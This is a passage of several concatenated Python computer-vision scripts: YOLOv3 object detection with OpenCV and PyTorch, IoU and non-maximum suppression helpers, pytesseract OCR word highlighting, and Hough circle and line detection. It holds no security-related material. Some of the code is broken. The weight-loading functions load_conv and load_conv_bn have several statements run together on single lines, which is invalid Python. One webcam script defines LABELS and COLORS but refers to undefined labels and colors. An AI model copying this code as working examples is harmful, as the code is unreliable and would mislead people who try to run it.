    grid_x = torch.linspace(0, w-1, w).repeat(h,1).repeat(batch*num_anchors, 1, 1).view(batch*num_anchors*h*w).type_as(output) #cuda()
    grid_y = torch.linspace(0, h-1, h).repeat(w,1).t().repeat(batch*num_anchors, 1, 1).view(batch*num_anchors*h*w).type_as(output) #cuda()
    xs = torch.sigmoid(output[0]) + grid_x
    ys = torch.sigmoid(output[1]) + grid_y

    anchor_w = torch.Tensor(anchors).view(num_anchors, anchor_step).index_select(1, torch.LongTensor([0]))
    anchor_h = torch.Tensor(anchors).view(num_anchors, anchor_step).index_select(1, torch.LongTensor([1]))
    anchor_w = anchor_w.repeat(batch, 1).repeat(1, 1, h*w).view(batch*num_anchors*h*w).type_as(output) #cuda()
    anchor_h = anchor_h.repeat(batch, 1).repeat(1, 1, h*w).view(batch*num_anchors*h*w).type_as(output) #cuda()
    ws = torch.exp(output[2]) * anchor_w
    hs = torch.exp(output[3]) * anchor_h

    det_confs = torch.sigmoid(output[4])
    cls_confs = torch.nn.Softmax(dim=1)(output[5:5+num_classes].transpose(0,1)).detach()
    cls_max_confs, cls_max_ids = torch.max(cls_confs, 1)
    cls_max_confs = cls_max_confs.view(-1)
    cls_max_ids = cls_max_ids.view(-1)

    
    sz_hw = h*w
    sz_hwa = sz_hw*num_anchors
    det_confs = convert2cpu(det_confs)
    cls_max_confs = convert2cpu(cls_max_confs)
    cls_max_ids = convert2cpu_long(cls_max_ids)
    xs = convert2cpu(xs)
    ys = convert2cpu(ys)
    ws = convert2cpu(ws)
    hs = convert2cpu(hs)
    if validation:
        cls_confs = convert2cpu(cls_confs.view(-1, num_classes))

    for b in range(batch):
        boxes = []
        for cy in range(h):
            for cx in range(w):
                for i in range(num_anchors):
                    ind = b*sz_hwa + i*sz_hw + cy*w + cx
                    det_conf =  det_confs[ind]
                    if only_objectness:
                        conf =  det_confs[ind]
                    else:
                        conf = det_confs[ind] * cls_max_confs[ind]
    
                    if conf > conf_thresh:
                        bcx = xs[ind]
                        bcy = ys[ind]
                        bw = ws[ind]
                        bh = hs[ind]
                        cls_max_conf = cls_max_confs[ind]
                        cls_max_id = cls_max_ids[ind]
                        box = [bcx/w, bcy/h, bw/w, bh/h, det_conf, cls_max_conf, cls_max_id]
                        if (not only_objectness) and validation:
                            for c in range(num_classes):
                                tmp_conf = cls_confs[ind][c]
                                if c != cls_max_id and det_confs[ind]*tmp_conf > conf_thresh:
                                    box.append(tmp_conf)
                                    box.append(c)
                        boxes.append(box)
        all_boxes.append(boxes)

    return all_boxes


def parse_cfg(cfgfile):
    blocks = []
    fp = open(cfgfile, 'r')
    block =  None
    line = fp.readline()
    while line != '':
        line = line.rstrip()
        if line == '' or line[0] == '#':
            line = fp.readline()
            continue        
        elif line[0] == '[':
            if block:
                blocks.append(block)
            block = dict()
            block['type'] = line.lstrip('[').rstrip(']')
            # set default value
            if block['type'] == 'convolutional':
                block['batch_normalize'] = 0
        else:
            key,value = line.split('=')
            key = key.strip()
            if key == 'type':
                key = '_type'
            value = value.strip()
            block[key] = value
        line = fp.readline()

    if block:
        blocks.append(block)
    fp.close()
    return blocks


def print_cfg(blocks):
    print('layer     filters    size              input                output')
    prev_width = 416
    prev_height = 416
    prev_filters = 3
    out_filters =[]
    out_widths =[]
    out_heights =[]
    ind = -2
    for block in blocks:
        ind = ind + 1
        if block['type'] == 'net':
            prev_width = int(block['width'])
            prev_height = int(block['height'])
            continue
        elif block['type'] == 'convolutional':
            filters = int(block['filters'])
            kernel_size = int(block['size'])
            stride = int(block['stride'])
            is_pad = int(block['pad'])
            pad = (kernel_size-1)//2 if is_pad else 0
            width = (prev_width + 2*pad - kernel_size)//stride + 1
            height = (prev_height + 2*pad - kernel_size)//stride + 1
            print('%5d %-6s %4d  %d x %d / %d   %3d x %3d x%4d   ->   %3d x %3d x%4d' % (ind, 'conv', filters, kernel_size, kernel_size, stride, prev_width, prev_height, prev_filters, width, height, filters))
            prev_width = width
            prev_height = height
            prev_filters = filters
            out_widths.append(prev_width)
            out_heights.append(prev_height)
            out_filters.append(prev_filters)
        elif block['type'] == 'upsample':
            stride = int(block['stride'])
            filters = prev_filters
            width = prev_width*stride
            height = prev_height*stride
            print('%5d %-6s           * %d   %3d x %3d x%4d   ->   %3d x %3d x%4d' % (ind, 'upsample', stride, prev_width, prev_height, prev_filters, width, height, filters))
            prev_width = width
            prev_height = height
            prev_filters = filters
            out_widths.append(prev_width)
            out_heights.append(prev_height)
            out_filters.append(prev_filters)
        elif block['type'] == 'route':
            layers = block['layers'].split(',')
            layers = [int(i) if int(i) > 0 else int(i)+ind for i in layers]
            if len(layers) == 1:
                print('%5d %-6s %d' % (ind, 'route', layers[0]))
                prev_width = out_widths[layers[0]]
                prev_height = out_heights[layers[0]]
                prev_filters = out_filters[layers[0]]
            elif len(layers) == 2:
                print('%5d %-6s %d %d' % (ind, 'route', layers[0], layers[1]))
                prev_width = out_widths[layers[0]]
                prev_height = out_heights[layers[0]]
                assert(prev_width == out_widths[layers[1]])
                assert(prev_height == out_heights[layers[1]])
                prev_filters = out_filters[layers[0]] + out_filters[layers[1]]
            out_widths.append(prev_width)
            out_heights.append(prev_height)
            out_filters.append(prev_filters)
        elif block['type'] in ['region', 'yolo']:
            print('%5d %-6s' % (ind, 'detection'))
            out_widths.append(prev_width)
            out_heights.append(prev_height)
            out_filters.append(prev_filters)
        elif block['type'] == 'shortcut':
            from_id = int(block['from'])
            from_id = from_id if from_id > 0 else from_id+ind
            print('%5d %-6s %d' % (ind, 'shortcut', from_id))
            prev_width = out_widths[from_id]
            prev_height = out_heights[from_id]
            prev_filters = out_filters[from_id]
            out_widths.append(prev_width)
            out_heights.append(prev_height)
            out_filters.append(prev_filters)
        else:
            print('unknown type %s' % (block['type']))

            
def load_conv(buf, start, conv_model):
    num_w = conv_model.weight.numel()
    num_b = conv_model.bias.numel()
    conv_model.bias.data.copy_(torch.from_numpy(buf[start:start+num_b]))   start = start + num_b
    conv_model.weight.data.copy_(torch.from_numpy(buf[start:start+num_w]).view_as(conv_model.weight.data)) start = start + num_w
    return start


def load_conv_bn(buf, start, conv_model, bn_model):
    num_w = conv_model.weight.numel()
    num_b = bn_model.bias.numel()
    bn_model.bias.data.copy_(torch.from_numpy(buf[start:start+num_b]))     start = start + num_b
    bn_model.weight.data.copy_(torch.from_numpy(buf[start:start+num_b]))   start = start + num_b
    bn_model.running_mean.copy_(torch.from_numpy(buf[start:start+num_b]))  start = start + num_b
    bn_model.running_var.copy_(torch.from_numpy(buf[start:start+num_b]))   start = start + num_b
    conv_model.weight.data.copy_(torch.from_numpy(buf[start:start+num_w]).view_as(conv_model.weight.data)) start = start + num_w
    return start




import cv2
import numpy as np

import time

CONFIDENCE = 0.5
SCORE_THRESHOLD = 0.5
IOU_THRESHOLD = 0.5
config_path = "cfg/yolov3.cfg"
weights_path = "weights/yolov3.weights"
font_scale = 1
thickness = 1
LABELS = open("data/coco.names").read().strip().split("\n")
COLORS = np.random.randint(0, 255, size=(len(LABELS), 3), dtype="uint8")

net = cv2.dnn.readNetFromDarknet(config_path, weights_path)

ln = net.getLayerNames()
ln = [ln[i[0] - 1] for i in net.getUnconnectedOutLayers()]

cap = cv2.VideoCapture(0)

while True:
    _, image = cap.read()

    h, w = image.shape[:2]
    blob = cv2.dnn.blobFromImage(image, 1/255.0, (416, 416), swapRB=True, crop=False)
    net.setInput(blob)
    start = time.perf_counter()
    layer_outputs = net.forward(ln)
    time_took = time.perf_counter() - start
    print("Time took:", time_took)
    boxes, confidences, class_ids = [], [], []

    # loop over each of the layer outputs
    for output in layer_outputs:
        # loop over each of the object detections
        for detection in output:
            # extract the class id (label) and confidence (as a probability) of
            # the current object detection
            scores = detection[5:]
            class_id = np.argmax(scores)
            confidence = scores[class_id]
            # discard weak predictions by ensuring the detected
            # probability is greater than the minimum probability
            if confidence > CONFIDENCE:
                # scale the bounding box coordinates back relative to the
                # size of the image, keeping in mind that YOLO actually
                # returns the center (x, y)-coordinates of the bounding
                # box followed by the boxes' width and height
                box = detection[:4] * np.array([w, h, w, h])
                (centerX, centerY, width, height) = box.astype("int")

                # use the center (x, y)-coordinates to derive the top and
                # and left corner of the bounding box
                x = int(centerX - (width / 2))
                y = int(centerY - (height / 2))

                # update our list of bounding box coordinates, confidences,
                # and class IDs
                boxes.append([x, y, int(width), int(height)])
                confidences.append(float(confidence))
                class_ids.append(class_id)

    # perform the non maximum suppression given the scores defined before
    idxs = cv2.dnn.NMSBoxes(boxes, confidences, SCORE_THRESHOLD, IOU_THRESHOLD)

    font_scale = 1
    thickness = 1

    # ensure at least one detection exists
    if len(idxs) > 0:
        # loop over the indexes we are keeping
        for i in idxs.flatten():
            # extract the bounding box coordinates
            x, y = boxes[i][0], boxes[i][1]
            w, h = boxes[i][2], boxes[i][3]
            # draw a bounding box rectangle and label on the image
            color = [int(c) for c in colors[class_ids[i]]]
            cv2.rectangle(image, (x, y), (x + w, y + h), color=color, thickness=thickness)
            text = f"{labels[class_ids[i]]}: {confidences[i]:.2f}"
            # calculate text width & height to draw the transparent boxes as background of the text
            (text_width, text_height) = cv2.getTextSize(text, cv2.FONT_HERSHEY_SIMPLEX, fontScale=font_scale, thickness=thickness)[0]
            text_offset_x = x
            text_offset_y = y - 5
            box_coords = ((text_offset_x, text_offset_y), (text_offset_x + text_width + 2, text_offset_y - text_height))
            overlay = image.copy()
            cv2.rectangle(overlay, box_coords[0], box_coords[1], color=color, thickness=cv2.FILLED)
            # add opacity (transparency to the box)
            image = cv2.addWeighted(overlay, 0.6, image, 0.4, 0)
            # now put the text (label: confidence %)
            cv2.putText(image, text, (x, y - 5), cv2.FONT_HERSHEY_SIMPLEX,
                fontScale=font_scale, color=(0, 0, 0), thickness=thickness)

    cv2.imshow("image", image)
    if ord("q") == cv2.waitKey(1):
        break

cap.release()
cv2.destroyAllWindows()




import cv2
import numpy as np

import time
import sys

CONFIDENCE = 0.5
SCORE_THRESHOLD = 0.5
IOU_THRESHOLD = 0.5
config_path = "cfg/yolov3.cfg"
weights_path = "weights/yolov3.weights"
font_scale = 1
thickness = 1
labels = open("data/coco.names").read().strip().split("\n")
colors = np.random.randint(0, 255, size=(len(labels), 3), dtype="uint8")

net = cv2.dnn.readNetFromDarknet(config_path, weights_path)

ln = net.getLayerNames()
ln = [ln[i[0] - 1] for i in net.getUnconnectedOutLayers()]
# read the file from the command line
video_file = sys.argv[1]
cap = cv2.VideoCapture(video_file)
_, image = cap.read()
h, w = image.shape[:2]
fourcc = cv2.VideoWriter_fourcc(*"XVID")
out = cv2.VideoWriter("output.avi", fourcc, 20.0, (w, h))
while True:
    _, image = cap.read()

    h, w = image.shape[:2]
    blob = cv2.dnn.blobFromImage(image, 1/255.0, (416, 416), swapRB=True, crop=False)
    net.setInput(blob)
    start = time.perf_counter()
    layer_outputs = net.forward(ln)
    time_took = time.perf_counter() - start
    print("Time took:", time_took)
    boxes, confidences, class_ids = [], [], []

    # loop over each of the layer outputs
    for output in layer_outputs:
        # loop over each of the object detections
        for detection in output:
            # extract the class id (label) and confidence (as a probability) of
            # the current object detection
            scores = detection[5:]
            class_id = np.argmax(scores)
            confidence = scores[class_id]
            # discard weak predictions by ensuring the detected
            # probability is greater than the minimum probability
            if confidence > CONFIDENCE:
                # scale the bounding box coordinates back relative to the
                # size of the image, keeping in mind that YOLO actually
                # returns the center (x, y)-coordinates of the bounding
                # box followed by the boxes' width and height
                box = detection[:4] * np.array([w, h, w, h])
                (centerX, centerY, width, height) = box.astype("int")

                # use the center (x, y)-coordinates to derive the top and
                # and left corner of the bounding box
                x = int(centerX - (width / 2))
                y = int(centerY - (height / 2))

                # update our list of bounding box coordinates, confidences,
                # and class IDs
                boxes.append([x, y, int(width), int(height)])
                confidences.append(float(confidence))
                class_ids.append(class_id)

    # perform the non maximum suppression given the scores defined before
    idxs = cv2.dnn.NMSBoxes(boxes, confidences, SCORE_THRESHOLD, IOU_THRESHOLD)

    font_scale = 1
    thickness = 1

    # ensure at least one detection exists
    if len(idxs) > 0:
        # loop over the indexes we are keeping
        for i in idxs.flatten():
            # extract the bounding box coordinates
            x, y = boxes[i][0], boxes[i][1]
            w, h = boxes[i][2], boxes[i][3]
            # draw a bounding box rectangle and label on the image
            color = [int(c) for c in colors[class_ids[i]]]
            cv2.rectangle(image, (x, y), (x + w, y + h), color=color, thickness=thickness)
            text = f"{labels[class_ids[i]]}: {confidences[i]:.2f}"
            # calculate text width & height to draw the transparent boxes as background of the text
            (text_width, text_height) = cv2.getTextSize(text, cv2.FONT_HERSHEY_SIMPLEX, fontScale=font_scale, thickness=thickness)[0]
            text_offset_x = x
            text_offset_y = y - 5
            box_coords = ((text_offset_x, text_offset_y), (text_offset_x + text_width + 2, text_offset_y - text_height))
            overlay = image.copy()
            cv2.rectangle(overlay, box_coords[0], box_coords[1], color=color, thickness=cv2.FILLED)
            # add opacity (transparency to the box)
            image = cv2.addWeighted(overlay, 0.6, image, 0.4, 0)
            # now put the text (label: confidence %)
            cv2.putText(image, text, (x, y - 5), cv2.FONT_HERSHEY_SIMPLEX,
                fontScale=font_scale, color=(0, 0, 0), thickness=thickness)

    out.write(image)
    cv2.imshow("image", image)
    
    if ord("q") == cv2.waitKey(1):
        break


cap.release()
cv2.destroyAllWindows()




import time
import torch
import numpy as np
import matplotlib.pyplot as plt
import matplotlib.patches as patches


def boxes_iou(box1, box2):
    """
    Returns the IOU between box1 and box2 (i.e intersection area divided by union area)
    """
    # Get the Width and Height of each bounding box
    width_box1 = box1[2]
    height_box1 = box1[3]
    width_box2 = box2[2]
    height_box2 = box2[3]
    
    # Calculate the area of the each bounding box
    area_box1 = width_box1 * height_box1
    area_box2 = width_box2 * height_box2
    
    # Find the vertical edges of the union of the two bounding boxes
    mx = min(box1[0] - width_box1/2.0, box2[0] - width_box2/2.0)
    Mx = max(box1[0] + width_box1/2.0, box2[0] + width_box2/2.0)
    
    # Calculate the width of the union of the two bounding boxes
    union_width = Mx - mx
    
    # Find the horizontal edges of the union of the two bounding boxes
    my = min(box1[1] - height_box1/2.0, box2[1] - height_box2/2.0)
    My = max(box1[1] + height_box1/2.0, box2[1] + height_box2/2.0)    
    
    # Calculate the height of the union of the two bounding boxes
    union_height = My - my
    
    # Calculate the width and height of the area of intersection of the two bounding boxes
    intersection_width = width_box1 + width_box2 - union_width
    intersection_height = height_box1 + height_box2 - union_height
   
    # If the the boxes don't overlap then their IOU is zero
    if intersection_width <= 0 or intersection_height <= 0:
        return 0.0

    # Calculate the area of intersection of the two bounding boxes
    intersection_area = intersection_width * intersection_height
    
    # Calculate the area of the union of the two bounding boxes
    union_area = area_box1 + area_box2 - intersection_area
    
    # Calculate the IOU
    iou = intersection_area/union_area
    
    return iou


def nms(boxes, iou_thresh):
    """
    Performs Non maximal suppression technique to boxes using iou_thresh threshold
    """
    # print(boxes.shape)
    # If there are no bounding boxes do nothing
    if len(boxes) == 0:
        return boxes
    
    # Create a PyTorch Tensor to keep track of the detection confidence
    # of each predicted bounding box
    det_confs = torch.zeros(len(boxes))
    
    # Get the detection confidence of each predicted bounding box
    for i in range(len(boxes)):
        det_confs[i] = boxes[i][4]

    # Sort the indices of the bounding boxes by detection confidence value in descending order.
    # We ignore the first returned element since we are only interested in the sorted indices
    _,sortIds = torch.sort(det_confs, descending = True)
    
    # Create an empty list to hold the best bounding boxes after
    # Non-Maximal Suppression (NMS) is performed
    best_boxes = []
    
    # Perform Non-Maximal Suppression 
    for i in range(len(boxes)):
        
        # Get the bounding box with the highest detection confidence first
        box_i = boxes[sortIds[i]]
        
        # Check that the detection confidence is not zero
        if box_i[4] > 0:
            
            # Save the bounding box 
            best_boxes.append(box_i)
            
            # Go through the rest of the bounding boxes in the list and calculate their IOU with
            # respect to the previous selected box_i. 
            for j in range(i + 1, len(boxes)):
                box_j = boxes[sortIds[j]]
                
                # If the IOU of box_i and box_j is higher than the given IOU threshold set
                # box_j's detection confidence to zero. 
                if boxes_iou(box_i, box_j) > iou_thresh:
                    box_j[4] = 0
                    
    return best_boxes


def detect_objects(model, img, iou_thresh, nms_thresh):
    
    # Start the time. This is done to calculate how long the detection takes.
    start = time.time()
    
    # Set the model to evaluation mode.
    model.eval()
    
    # Convert the image from a NumPy ndarray to a PyTorch Tensor of the correct shape.
    # The image is transposed, then converted to a FloatTensor of dtype float32, then
    # Normalized to values between 0 and 1, and finally unsqueezed to have the correct
    # shape of 1 x 3 x 416 x 416
    img = torch.from_numpy(img.transpose(2,0,1)).float().div(255.0).unsqueeze(0)
    
    # Feed the image to the neural network with the corresponding NMS threshold.
    # The first step in NMS is to remove all bounding boxes that have a very low
    # probability of detection. All predicted bounding boxes with a value less than
    # the given NMS threshold will be removed.
    list_boxes = model(img, nms_thresh)
    
    # Make a new list with all the bounding boxes returned by the neural network
    boxes = list_boxes[0][0] + list_boxes[1][0] + list_boxes[2][0]
    
    # Perform the second step of NMS on the bounding boxes returned by the neural network.
    # In this step, we only keep the best bounding boxes by eliminating all the bounding boxes
    # whose IOU value is higher than the given IOU threshold
    boxes = nms(boxes, iou_thresh)
    
    # Stop the time. 
    finish = time.time()
    
    # Print the time it took to detect objects
    print('\n\nIt took {:.3f}'.format(finish - start), 'seconds to detect the objects in the image.\n')
    
    # Print the number of objects detected
    print('Number of Objects Detected:', len(boxes), '\n')
    
    return boxes


def load_class_names(namesfile):
    
    # Create an empty list to hold the object classes
    class_names = []
    
    # Open the file containing the COCO object classes in read-only mode
    with open(namesfile, 'r') as fp:
        
        # The coco.names file contains only one object class per line.
        # Read the file line by line and save all the lines in a list.
        lines = fp.readlines()
    
    # Get the object class names
    for line in lines:
        
        # Make a copy of each line with any trailing whitespace removed
        line = line.rstrip()
        
        # Save the object class name into class_names
        class_names.append(line)
        
    return class_names


def print_objects(boxes, class_names):    
    print('Objects Found and Confidence Level:\n')
    for i in range(len(boxes)):
        box = boxes[i]
        if len(box) >= 7 and class_names:
            cls_conf = box[5]
            cls_id = box[6]
            print('%i. %s: %f' % (i + 1, class_names[cls_id], cls_conf))

            
def plot_boxes(img, boxes, class_names, plot_labels, color = None):
    
    # Define a tensor used to set the colors of the bounding boxes
    colors = torch.FloatTensor([[1,0,1],[0,0,1],[0,1,1],[0,1,0],[1,1,0],[1,0,0]])
    
    # Define a function to set the colors of the bounding boxes
    def get_color(c, x, max_val):
        ratio = float(x) / max_val * 5
        i = int(np.floor(ratio))
        j = int(np.ceil(ratio))
        
        ratio = ratio - i
        r = (1 - ratio) * colors[i][c] + ratio * colors[j][c]
        
        return int(r * 255)
    
    # Get the width and height of the image
    width = img.shape[1]
    height = img.shape[0]
    
    # Create a figure and plot the image
    fig, a = plt.subplots(1,1)
    a.imshow(img)
    
    # Plot the bounding boxes and corresponding labels on top of the image
    for i in range(len(boxes)):
        
        # Get the ith bounding box
        box = boxes[i]
        
        # Get the (x,y) pixel coordinates of the lower-left and lower-right corners
        # of the bounding box relative to the size of the image. 
        x1 = int(np.around((box[0] - box[2]/2.0) * width))
        y1 = int(np.around((box[1] - box[3]/2.0) * height))
        x2 = int(np.around((box[0] + box[2]/2.0) * width))
        y2 = int(np.around((box[1] + box[3]/2.0) * height))
        
        # Set the default rgb value to red
        rgb = (1, 0, 0)
            
        # Use the same color to plot the bounding boxes of the same object class
        if len(box) >= 7 and class_names:
            cls_conf = box[5]
            cls_id = box[6]
            classes = len(class_names)
            offset = cls_id * 123457 % classes
            red   = get_color(2, offset, classes) / 255
            green = get_color(1, offset, classes) / 255
            blue  = get_color(0, offset, classes) / 255
            
            # If a color is given then set rgb to the given color instead
            if color is None:
                rgb = (red, green, blue)
            else:
                rgb = color
        
        # Calculate the width and height of the bounding box relative to the size of the image.
        width_x = x2 - x1
        width_y = y1 - y2
        
        # Set the postion and size of the bounding box. (x1, y2) is the pixel coordinate of the
        # lower-left corner of the bounding box relative to the size of the image.
        rect = patches.Rectangle((x1, y2),
                                 width_x, width_y,
                                 linewidth = 2,
                                 edgecolor = rgb,
                                 facecolor = 'none')

        # Draw the bounding box on top of the image
        a.add_patch(rect)
        
        # If plot_labels = True then plot the corresponding label
        if plot_labels:
            
            # Create a string with the object class name and the corresponding object class probability
            conf_tx = class_names[cls_id] + ': {:.1f}'.format(cls_conf)
            
            # Define x and y offsets for the labels
            lxc = (img.shape[1] * 0.266) / 100
            lyc = (img.shape[0] * 1.180) / 100
            
            # Draw the labels on top of the image
            a.text(x1 + lxc, y1 - lyc, conf_tx, fontsize = 12, color = 'k',
                   bbox = dict(facecolor = rgb, edgecolor = rgb, alpha = 0.6))        
        
    plt.savefig("output.jpg")
    plt.show()




import cv2
import matplotlib.pyplot as plt
from utils import *
from darknet import Darknet

# Set the NMS Threshold
score_threshold = 0.6
# Set the IoU threshold
iou_threshold = 0.4
cfg_file = "cfg/yolov3.cfg"
weight_file = "weights/yolov3.weights"
namesfile = "data/coco.names"
m = Darknet(cfg_file)
m.load_weights(weight_file)
class_names = load_class_names(namesfile)
# m.print_network()
original_image = cv2.imread("images/city_scene.jpg")
original_image = cv2.cvtColor(original_image, cv2.COLOR_BGR2RGB)
img = cv2.resize(original_image, (m.width, m.height))
# detect the objects
boxes = detect_objects(m, img, iou_threshold, score_threshold)
print(boxes[0])
print(boxes[1])
print(boxes[2])
# plot the image with the bounding boxes and corresponding object class labels
plot_boxes(original_image, boxes, class_names, plot_labels=True)




import cv2
import numpy as np

import time
import sys
import os

CONFIDENCE = 0.5
SCORE_THRESHOLD = 0.5
IOU_THRESHOLD = 0.5

# the neural network configuration
config_path = "cfg/yolov3.cfg"
# the YOLO net weights file
weights_path = "weights/yolov3.weights"

# loading all the class labels (objects)
labels = open("data/coco.names").read().strip().split("\n")
# generating colors for each object for later plotting
colors = np.random.randint(0, 255, size=(len(labels), 3), dtype="uint8")

# load the YOLO network
net = cv2.dnn.readNetFromDarknet(config_path, weights_path)

# path_name = "images/city_scene.jpg"
path_name = sys.argv[1]
image = cv2.imread(path_name)
file_name = os.path.basename(path_name)
filename, ext = file_name.split(".")

h, w = image.shape[:2]
# create 4D blob
blob = cv2.dnn.blobFromImage(image, 1/255.0, (416, 416), swapRB=True, crop=False)

# sets the blob as the input of the network
net.setInput(blob)

# get all the layer names
ln = net.getLayerNames()
ln = [ln[i[0] - 1] for i in net.getUnconnectedOutLayers()]
# feed forward (inference) and get the network output
# measure how much it took in seconds
start = time.perf_counter()
layer_outputs = net.forward(ln)
time_took = time.perf_counter() - start
print(f"Time took: {time_took:.2f}s")

boxes, confidences, class_ids = [], [], []

# loop over each of the layer outputs
for output in layer_outputs:
    # loop over each of the object detections
    for detection in output:
        # extract the class id (label) and confidence (as a probability) of
        # the current object detection
        scores = detection[5:]
        class_id = np.argmax(scores)
        confidence = scores[class_id]
        # discard weak predictions by ensuring the detected
        # probability is greater than the minimum probability
        if confidence > CONFIDENCE:
            # scale the bounding box coordinates back relative to the
            # size of the image, keeping in mind that YOLO actually
            # returns the center (x, y)-coordinates of the bounding
            # box followed by the boxes' width and height
            box = detection[:4] * np.array([w, h, w, h])
            (centerX, centerY, width, height) = box.astype("int")

            # use the center (x, y)-coordinates to derive the top and
            # and left corner of the bounding box
            x = int(centerX - (width / 2))
            y = int(centerY - (height / 2))

            # update our list of bounding box coordinates, confidences,
            # and class IDs
            boxes.append([x, y, int(width), int(height)])
            confidences.append(float(confidence))
            class_ids.append(class_id)

# perform the non maximum suppression given the scores defined before
idxs = cv2.dnn.NMSBoxes(boxes, confidences, SCORE_THRESHOLD, IOU_THRESHOLD)

font_scale = 1
thickness = 1

# ensure at least one detection exists
if len(idxs) > 0:
    # loop over the indexes we are keeping
    for i in idxs.flatten():
        # extract the bounding box coordinates
        x, y = boxes[i][0], boxes[i][1]
        w, h = boxes[i][2], boxes[i][3]
        # draw a bounding box rectangle and label on the image
        color = [int(c) for c in colors[class_ids[i]]]
        cv2.rectangle(image, (x, y), (x + w, y + h), color=color, thickness=thickness)
        text = f"{labels[class_ids[i]]}: {confidences[i]:.2f}"
        # calculate text width & height to draw the transparent boxes as background of the text
        (text_width, text_height) = cv2.getTextSize(text, cv2.FONT_HERSHEY_SIMPLEX, fontScale=font_scale, thickness=thickness)[0]
        text_offset_x = x
        text_offset_y = y - 5
        box_coords = ((text_offset_x, text_offset_y), (text_offset_x + text_width + 2, text_offset_y - text_height))
        overlay = image.copy()
        cv2.rectangle(overlay, box_coords[0], box_coords[1], color=color, thickness=cv2.FILLED)
        # add opacity (transparency to the box)
        image = cv2.addWeighted(overlay, 0.6, image, 0.4, 0)
        # now put the text (label: confidence %)
        cv2.putText(image, text, (x, y - 5), cv2.FONT_HERSHEY_SIMPLEX,
            fontScale=font_scale, color=(0, 0, 0), thickness=thickness)
        

# cv2.imshow("image", image)
# if cv2.waitKey(0) == ord("q"):
#     pass

cv2.imwrite(filename + "_yolo3." + ext, image)




import pytesseract
import cv2
import sys
import matplotlib.pyplot as plt
from PIL import Image

# read the image using OpenCV
image = cv2.imread(sys.argv[1])

# make a copy of this image to draw in
image_copy = image.copy()

# the target word to search for
target_word = sys.argv[2]

# get all data from the image
data = pytesseract.image_to_data(image, output_type=pytesseract.Output.DICT)

# get all occurences of the that word
word_occurences = [ i for i, word in enumerate(data["text"]) if word.lower() == target_word ]

for occ in word_occurences:
    # extract the width, height, top and left position for that detected word
    w = data["width"][occ]
    h = data["height"][occ]
    l = data["left"][occ]
    t = data["top"][occ]
    # define all the surrounding box points
    p1 = (l, t)
    p2 = (l + w, t)
    p3 = (l + w, t + h)
    p4 = (l, t + h)
    # draw the 4 lines (rectangular)
    image_copy = cv2.line(image_copy, p1, p2, color=(255, 0, 0), thickness=2)
    image_copy = cv2.line(image_copy, p2, p3, color=(255, 0, 0), thickness=2)
    image_copy = cv2.line(image_copy, p3, p4, color=(255, 0, 0), thickness=2)
    image_copy = cv2.line(image_copy, p4, p1, color=(255, 0, 0), thickness=2)

plt.imsave("all_dog_words.png", image_copy)
plt.imshow(image_copy)
plt.show()




import pytesseract
import cv2
import matplotlib.pyplot as plt
import sys
from PIL import Image

# read the image using OpenCV 
# from the command line first argument
image = cv2.imread(sys.argv[1])
# or you can use Pillow
# image = Image.open(sys.argv[1])

# get the string
string = pytesseract.image_to_string(image)
# print it
print(string)

# get all data
# data = pytesseract.image_to_data(image)

# print(data)




import pytesseract
import cv2
import matplotlib.pyplot as plt
from PIL import Image

# the target word to search for
target_word = "your"

cap = cv2.VideoCapture(0)

while True:
    # read the image from the cam
    _, image = cap.read()

    # make a copy of this image to draw in
    image_copy = image.copy()

    # get all data from the image
    data = pytesseract.image_to_data(image, output_type=pytesseract.Output.DICT)

    # print the data
    print(data["text"])

    # get all occurences of the that word
    word_occurences = [ i for i, word in enumerate(data["text"]) if word.lower() == target_word ]

    for occ in word_occurences:
        # extract the width, height, top and left position for that detected word
        w = data["width"][occ]
        h = data["height"][occ]
        l = data["left"][occ]
        t = data["top"][occ]
        # define all the surrounding box points
        p1 = (l, t)
        p2 = (l + w, t)
        p3 = (l + w, t + h)
        p4 = (l, t + h)
        # draw the 4 lines (rectangular)
        image_copy = cv2.line(image_copy, p1, p2, color=(255, 0, 0), thickness=2)
        image_copy = cv2.line(image_copy, p2, p3, color=(255, 0, 0), thickness=2)
        image_copy = cv2.line(image_copy, p3, p4, color=(255, 0, 0), thickness=2)
        image_copy = cv2.line(image_copy, p4, p1, color=(255, 0, 0), thickness=2)

    if cv2.waitKey(1) == ord("q"):
        break

    cv2.imshow("image_copy", image_copy)

cap.release()
cv2.destroyAllWindows()




import cv2
import numpy as np
import matplotlib.pyplot as plt
import sys

# load the image
img = cv2.imread(sys.argv[1])
# convert BGR to RGB to be suitable for showing using matplotlib library
img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
# make a copy of the original image
cimg = img.copy()
# convert image to grayscale
img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
# apply a blur using the median filter
img = cv2.medianBlur(img, 5)
# finds the circles in the grayscale image using the Hough transform
circles = cv2.HoughCircles(image=img, method=cv2.HOUGH_GRADIENT, dp=0.9, 
                            minDist=80, param1=110, param2=39, maxRadius=70)

for co, i in enumerate(circles[0, :], start=1):
    # draw the outer circle in green
    cv2.circle(cimg,(i[0],i[1]),i[2],(0,255,0),2)
    # draw the center of the circle in red
    cv2.circle(cimg,(i[0],i[1]),2,(0,0,255),3)
    
# print the number of circles detected
print("Number of circles detected:", co)
# save the image, convert to BGR to save with proper colors
# cv2.imwrite("coins_circles_detected.png", cimg)
# show the image
plt.imshow(cimg)
plt.show()




import numpy as np
import matplotlib.pyplot as plt
import cv2

cap = cv2.VideoCapture(0)

while True:
    _, image = cap.read()
    # convert to grayscale
    grayscale = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    # perform edge detection
    edges = cv2.Canny(grayscale, 30, 100)
    # detect lines in the image using hough lines technique
    lines = cv2.HoughLinesP(edges, 1, np.pi/180, 60, np.array([]), 50, 5)
    # iterate over the output lines and draw them
    for line in lines:
        for x1, y1, x2, y2 in line:
            cv2.line(image, (x1, y1), (x2, y2), (255, 0, 0), 3)
            cv2.line(edges, (x1, y1), (x2, y2), (255, 0, 0), 3)
    # show images
    cv2.imshow("image", image)
    cv2.imshow("edges", edges)
    if cv2.waitKey(1) == ord("q"):
        break

cap.release()
cv2.destroyAllWindows()




import numpy as np
import matplotlib.pyplot as plt
import cv2
import sys

# read the image
image = cv2.imread(sys.argv[1])

# convert to grayscale
grayscale = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)

# perform edge detection
edges = cv2.Canny(grayscale, 30, 100)

# detect lines in the image using hough lines technique
lines = cv2.HoughLinesP(edges, 1, np.pi/180, 60, np.array([]), 50, 5)
# iterate over the output lines and draw them
for line in lines:
